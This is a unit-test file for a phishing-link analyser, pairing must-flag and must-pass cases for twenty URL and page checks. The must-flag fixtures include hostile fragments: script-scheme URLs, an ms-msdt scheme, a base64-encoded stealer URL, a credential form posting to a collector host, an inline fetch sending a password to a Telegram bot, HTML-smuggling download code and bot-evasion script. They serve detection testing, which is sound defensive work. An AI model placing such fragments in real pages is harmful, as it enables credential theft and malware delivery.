"""Each check: one case that must be flagged and one that must NOT be (false positives erode trust)."""
import pytest

from modules.link_analysis.domain.checks.address import (DangerousSchemeCheck, HomographCheck, LookalikeCheck, ObfuscationCheck, PortPathAnomalyCheck,
                                                         SubdomainSpoofingCheck, UserInfoMaskingCheck)
from modules.link_analysis.domain.checks.behavior import (AutoDownloadCheck, BrandUrgencyCheck, CloakingCheck, FormActionMismatchCheck,
                                                          HiddenElementsCheck, LoginFormCheck)
from modules.link_analysis.domain.checks.base import CheckStatus as S
from modules.link_analysis.domain.checks.journey import DisplayMismatchCheck, OpenRedirectCheck, RedirectChainCheck
from modules.link_analysis.domain.checks.reputation import BlocklistCheck, DomainAgeCheck, HostingRiskCheck, TlsCertificateCheck
from modules.link_analysis.domain.evidence import (BlocklistHit, BlocklistReport, DnsReport, ElementInfo, Evidence, FrameInfo, HostingEntry, HostingReport)
from tests.unit.helpers import EMAIL, PWD, form, journey, page, reg, tls

DANGER, WARN, NOTICE, CLEAR, NA = S.DANGER, S.WARNING, S.NOTICE, S.CLEAR, S.UNAVAILABLE


# 1 ---------------------------------------------------------------------------------------------------
def test_blocklist(run):
    hit = BlocklistReport(("OpenPhish",), (), (BlocklistHit("OpenPhish", "https://x.test/", "url", "phishing"),))
    assert run(BlocklistCheck(), "https://x.test/", blocklist=hit).status is DANGER
    assert run(BlocklistCheck(), "https://x.test/", blocklist=BlocklistReport(("OpenPhish",))).status is CLEAR
    assert run(BlocklistCheck(), "https://x.test/", blocklist=BlocklistReport((), (("OpenPhish", "down"),))).status is NA   # unreachable != clean
    assert run(BlocklistCheck(), "https://x.test/").status is NA


# 2 ---------------------------------------------------------------------------------------------------
@pytest.mark.parametrize("url", ["https://paypa1-login.com/", "https://paypal-secure-login.xyz/", "https://micros0ft-support.top/", "https://gooogle.com/", "https://paypal.co/", "https://rnicrosoft.com/"])
def test_lookalike_flags_impersonation(run, url):
    assert run(LookalikeCheck(), url).status is DANGER


@pytest.mark.parametrize("url", ["https://www.paypal.com/", "https://amazon.co.uk/", "https://wikipedia.org/", "https://example.com/", "https://my-garden-club.org/", "https://accounts.google.com/"])
def test_lookalike_leaves_real_domains_alone(run, url):
    assert run(LookalikeCheck(), url).status is CLEAR


# 3 ---------------------------------------------------------------------------------------------------
def test_homograph(run):
    r = run(HomographCheck(), "https://pаypal.com/")                       # Cyrillic 'а'
    assert r.status is DANGER and r.risk_points >= 75
    assert run(HomographCheck(), "https://paypal.com/").status is CLEAR
    assert run(HomographCheck(), "https://مثال.إختبار/").status in (CLEAR,)  # a genuine Arabic IDN is not an attack
    assert run(HomographCheck(), "https://paypal∕evil.com/").status is not CLEAR  # division-slash look-alike


# 4 ---------------------------------------------------------------------------------------------------
def test_redirect_chain(run):
    assert run(RedirectChainCheck(), "https://bit.ly/abc", journey=journey(["https://bit.ly/abc", "https://a.test/"])).status is NOTICE
    meta = journey(["https://a.test/", "https://b.test/"], vias=["initial", "meta_refresh"])
    assert run(RedirectChainCheck(), "https://a.test/", journey=meta).status is WARN
    assert run(RedirectChainCheck(), "https://a.test/", journey=journey(["https://a.test/"])).status is CLEAR
    assert run(RedirectChainCheck(), "https://a.test/").status is NA
    assert run(RedirectChainCheck(), "https://grabify.link/x").status is DANGER   # IP-logger service


# 5 ---------------------------------------------------------------------------------------------------
def test_open_redirect(run):
    url = "https://www.paypal.com/go?url=https://evil.example/login"
    assert run(OpenRedirectCheck(), url, journey=journey([url, "https://evil.example/login"])).risk_points >= 75   # confirmed on a trusted domain
    assert run(OpenRedirectCheck(), url, journey=Evidence.missing("offline")).status is DANGER                   # parameter alone, trusted start
    assert run(OpenRedirectCheck(), "https://my-site.example/go?url=https://other.example/", journey=Evidence.missing("x")).status is WARN
    assert run(OpenRedirectCheck(), "https://www.paypal.com/signin", journey=journey(["https://www.paypal.com/signin"])).status is CLEAR


# 6 ---------------------------------------------------------------------------------------------------
def test_userinfo_masking(run):
    r = run(UserInfoMaskingCheck(), "https://trusted.com@evil-site.com/")
    assert r.status is DANGER and r.risk_points >= 75
    assert run(UserInfoMaskingCheck(), "https://evil.com\\@good.com/").status is DANGER
    assert run(UserInfoMaskingCheck(), "https://good.example/path").status is CLEAR


# 7 ---------------------------------------------------------------------------------------------------
def test_subdomain_spoofing(run):
    assert run(SubdomainSpoofingCheck(), "https://login.microsoft.com.evil-co.xyz/").status is DANGER
    assert run(SubdomainSpoofingCheck(), "https://secure-paypal-com.evil.top/").status is DANGER
    assert run(SubdomainSpoofingCheck(), "https://login.microsoftonline.com/").status is CLEAR
    assert run(SubdomainSpoofingCheck(), "https://blog.example.com/").status is CLEAR


# 8 ---------------------------------------------------------------------------------------------------
def test_obfuscation(run):
    assert run(ObfuscationCheck(), "https://a.example/%70%61%79%70%61%6c%2f").status is DANGER
    b64 = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvc3RlYWwucGhwP3Q9MTIzNDU2Nzg5MA"
    assert run(ObfuscationCheck(), f"https://a.example/r?d={b64}").status is DANGER
    assert run(ObfuscationCheck(), "http://3232235777/").status is DANGER
    assert run(ObfuscationCheck(), "https://example.com/products?id=42&sort=asc").status is CLEAR


# 9 ---------------------------------------------------------------------------------------------------
def test_dangerous_scheme(run):
    assert run(DangerousSchemeCheck(), "javascript:alert(1)").status is DANGER
    assert run(DangerousSchemeCheck(), "data:text/html,<script>x</script>").status is DANGER
    assert run(DangerousSchemeCheck(), "ms-msdt:/id PCWDiagnostic").status is DANGER
    assert run(DangerousSchemeCheck(), "mailto:a@b.example").status is NOTICE
    assert run(DangerousSchemeCheck(), "https://example.com").status is CLEAR


# 10 --------------------------------------------------------------------------------------------------
def test_domain_age(run):
    j = journey(["https://new.example/"])
    assert run(DomainAgeCheck(), "https://new.example/", registration=reg("new.example", 3), journey=j).status is DANGER
    assert run(DomainAgeCheck(), "https://new.example/", registration=reg("new.example", 60), journey=j).status is NOTICE
    assert run(DomainAgeCheck(), "https://old.example/", registration=reg("old.example", 3000), journey=journey(["https://old.example/"])).status is CLEAR
    assert run(DomainAgeCheck(), "https://new.example/", journey=j).status is NA
    assert run(DomainAgeCheck(), "http://93.184.216.34/", registration=reg("x.example", 1), journey=journey(["http://93.184.216.34/"])).status is NA


# 11 --------------------------------------------------------------------------------------------------
def test_tls(run):
    j = journey(["https://example.com/"])
    assert run(TlsCertificateCheck(), "https://example.com/", tls=tls(), journey=j).status is CLEAR
    assert run(TlsCertificateCheck(), "https://example.com/", tls=tls(verified=False, error="certificate has expired"), journey=j).status is DANGER
    assert run(TlsCertificateCheck(), "https://example.com/", tls=tls(verified=False, error="Hostname mismatch, certificate is not valid for 'example.com'"), journey=j).status is DANGER
    assert run(TlsCertificateCheck(), "http://example.com/", tls=tls(https=False), journey=journey(["http://example.com/"])).status is WARN
    assert run(TlsCertificateCheck(), "https://example.com/").status is NA
    r = run(TlsCertificateCheck(), "https://example.com/", tls=tls(), journey=j)
    assert any("free certificates" in f.message for f in r.findings)       # the brief: note that attackers use free SSL too


# 12 --------------------------------------------------------------------------------------------------
def test_hosting(run):
    dns = DnsReport({"a.example": ("203.0.113.5",)})
    ok = HostingReport((HostingEntry("203.0.113.5", 64500, "EXAMPLE-NET", "US"),))
    bad = HostingReport((HostingEntry("203.0.113.5", 64500, "EXAMPLE-NET", "US", listed_in=("Spamhaus DROP",)),))
    j = journey(["https://a.example/"])
    assert run(HostingRiskCheck(), "https://a.example/", dns=dns, hosting=ok, journey=j).status is CLEAR
    assert run(HostingRiskCheck(), "https://a.example/", dns=dns, hosting=bad, journey=j).status is DANGER
    assert run(HostingRiskCheck(), "http://203.0.113.5/", dns=DnsReport({"203.0.113.5": ("203.0.113.5",)}), hosting=ok, journey=journey(["http://203.0.113.5/"])).status is DANGER
    assert run(HostingRiskCheck(), "https://x.duckdns.org/", dns=DnsReport({"x.duckdns.org": ("203.0.113.5",)}), hosting=ok, journey=journey(["https://x.duckdns.org/"])).status is WARN
    blocked = DnsReport({}, {"a.example": ("blocked", "private")})
    assert run(HostingRiskCheck(), "https://a.example/", dns=blocked, hosting=Evidence.missing("x"), journey=j).status is DANGER


# 13 --------------------------------------------------------------------------------------------------
def test_port_path(run):
    assert run(PortPathAnomalyCheck(), "https://a.example:4444/").status is WARN
    assert run(PortPathAnomalyCheck(), "https://a.example/invoice.pdf.exe").status is DANGER
    served_html = journey(["https://a.example/invoice.pdf"], sniffed="html")
    assert run(PortPathAnomalyCheck(), "https://a.example/invoice.pdf", journey=served_html).status is DANGER
    assert run(PortPathAnomalyCheck(), "https://a.example/login?e=victim@example.com").status is WARN
    assert run(PortPathAnomalyCheck(), "https://a.example/docs/guide.html", journey=journey(["https://a.example/docs/guide.html"])).status is CLEAR


# 14 --------------------------------------------------------------------------------------------------
def test_login_form(run):
    login = page(forms=(form("/post", EMAIL, PWD),), title="Sign in")
    j = journey(["https://unknown.example/"], login)
    assert run(LoginFormCheck(), "https://unknown.example/", journey=j, registration=reg("unknown.example", 2)).status is DANGER
    assert run(LoginFormCheck(), "https://unknown.example/", journey=j, registration=reg("unknown.example", 2000)).status is NOTICE
    official = journey(["https://accounts.google.com/"], login)
    assert run(LoginFormCheck(), "https://accounts.google.com/", journey=official).status is CLEAR
    seed = page(forms=(form("/p", {"type": "textarea", "name": "recovery_phrase"}),))
    assert run(LoginFormCheck(), "https://x.example/", journey=journey(["https://x.example/"], seed)).risk_points >= 75
    assert run(LoginFormCheck(), "https://x.example/", journey=journey(["https://x.example/"], page(title="News"))).status is CLEAR
    assert run(LoginFormCheck(), "https://x.example/").status is NA


# 15 --------------------------------------------------------------------------------------------------
def test_form_action(run):
    base = "https://bank-login.example/"
    cross = page(forms=(form("https://collector.example/post.php", EMAIL, PWD),))
    assert run(FormActionMismatchCheck(), base, journey=journey([base], cross)).status is DANGER
    same = page(forms=(form("/session", EMAIL, PWD),))
    assert run(FormActionMismatchCheck(), base, journey=journey([base], same)).status is CLEAR
    mail = page(forms=(form("mailto:thief@example.com", EMAIL, PWD),))
    assert run(FormActionMismatchCheck(), base, journey=journey([base], mail)).status is DANGER
    tg = page(forms=(form("/x", PWD),), inline_scripts=("fetch('https://api.telegram.org/bot123:ABC/sendMessage?text='+pw)",))
    assert run(FormActionMismatchCheck(), base, journey=journey([base], tg)).status is DANGER
    search = page(forms=(form("https://www.google.com/search", {"type": "text", "name": "q"}),))
    assert run(FormActionMismatchCheck(), base, journey=journey([base], search)).status is NOTICE


# 16 --------------------------------------------------------------------------------------------------
def test_brand_urgency(run):
    phish = page(title="PayPal - Log in", visible_text="Your account has been suspended. Verify your identity within 24 hours.", forms=(form("/p", PWD),))
    assert run(BrandUrgencyCheck(), "https://x-secure.example/", journey=journey(["https://x-secure.example/"], phish)).status is DANGER
    on_brand = journey(["https://www.paypal.com/signin"], phish)
    assert run(BrandUrgencyCheck(), "https://www.paypal.com/signin", journey=on_brand).status is CLEAR
    news = page(title="Local garden newsletter", visible_text="Plant tomatoes on Saturday.")
    assert run(BrandUrgencyCheck(), "https://garden.example/", journey=journey(["https://garden.example/"], news)).status is CLEAR
    arabic = page(title="تسجيل الدخول", visible_text="تم تعليق حسابك. تحقق من حسابك خلال 24 ساعة. تنبيه أمني", forms=(form("/p", PWD),))
    assert run(BrandUrgencyCheck(), "https://x.example/", journey=journey(["https://x.example/"], arabic)).status is not CLEAR


# 17 --------------------------------------------------------------------------------------------------
def test_hidden_elements(run):
    overlay = page(elements=(ElementInfo("div", "", "ghost", "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0", False, False, 1, 1),))
    assert run(HiddenElementsCheck(), "https://a.example/", journey=journey(["https://a.example/"], overlay)).status is DANGER
    via_stylesheet = page(elements=(ElementInfo("div", "", "ghost", "", False, False, 1, 1),), style_rules=((".ghost", "position:fixed;inset:0;z-index:500;opacity:0"),))
    assert run(HiddenElementsCheck(), "https://a.example/", journey=journey(["https://a.example/"], via_stylesheet)).status is DANGER
    frame = page(iframes=(FrameInfo("https://tracker.example/f", "", "0", "0"),))
    assert run(HiddenElementsCheck(), "https://a.example/", journey=journey(["https://a.example/"], frame)).status is DANGER
    assert run(HiddenElementsCheck(), "https://a.example/", journey=journey(["https://a.example/"], page(title="ok"))).status is CLEAR


# 18 --------------------------------------------------------------------------------------------------
def test_auto_download(run):
    exe = journey(["https://a.example/setup"], ct="application/octet-stream", sniffed="executable")
    assert run(AutoDownloadCheck(), "https://a.example/setup", journey=exe).risk_points >= 75
    fake_pdf = journey(["https://a.example/invoice.pdf"], ct="application/pdf", sniffed="executable")
    assert run(AutoDownloadCheck(), "https://a.example/invoice.pdf", journey=fake_pdf).status is DANGER
    smuggle = page(inline_scripts=("var b=new Blob([data]);var u=URL.createObjectURL(b);a.href=u;a.download='x.zip';a.click()",))
    assert run(AutoDownloadCheck(), "https://a.example/", journey=journey(["https://a.example/"], smuggle)).status is DANGER
    assert run(AutoDownloadCheck(), "https://a.example/", journey=journey(["https://a.example/"], page(title="ok"))).status is CLEAR
    assert run(AutoDownloadCheck(), "https://a.example/", journey=journey(["https://a.example/"], outcome="dns_failed", status=None)).status is NA


# 19 --------------------------------------------------------------------------------------------------
def test_cloaking(run):
    ok_page = page(title="Home", visible_text="a b c d e f g h i j k l m n o p")
    a = journey(["https://a.example/"], ok_page)
    blocked = journey(["https://a.example/"], None, status=403, outcome="ok")
    assert run(CloakingCheck(), "https://a.example/", journey=blocked, journey_browser=a).status is WARN
    other = journey(["https://b.other.example/"], ok_page, profile="browser")
    assert run(CloakingCheck(), "https://a.example/", journey=a, journey_browser=other).status is DANGER
    evasive = page(title="x", inline_scripts=("if (navigator.webdriver) { location='/x' }",))
    assert run(CloakingCheck(), "https://a.example/", journey=journey(["https://a.example/"], evasive), journey_browser=a).status is WARN
    assert run(CloakingCheck(), "https://a.example/", journey=a, journey_browser=journey(["https://a.example/"], ok_page, profile="browser")).status is CLEAR
    assert run(CloakingCheck(), "https://a.example/").status is NA


# 20 --------------------------------------------------------------------------------------------------
def test_display_mismatch(run):
    j = journey(["https://evil-site.example/"], page(title="Welcome"))
    r = run(DisplayMismatchCheck(), "https://evil-site.example/", "Click here: https://www.paypal.com/signin", journey=j)
    assert r.status is DANGER and r.risk_points >= 75
    assert run(DisplayMismatchCheck(), "https://evil-site.example/", "Official PayPal portal", journey=j).status is DANGER
    assert run(DisplayMismatchCheck(), "https://garden.example/news", "Read our newsletter", journey=journey(["https://garden.example/news"], page(title="News"))).status is CLEAR
    claims = page(title="Sign in to your Microsoft account", og_url="https://login.microsoftonline.com/")
    assert run(DisplayMismatchCheck(), "https://evil-site.example/", None, journey=journey(["https://evil-site.example/"], claims)).status is DANGER
    assert run(DisplayMismatchCheck(), "https://x.example/", None).status is NA
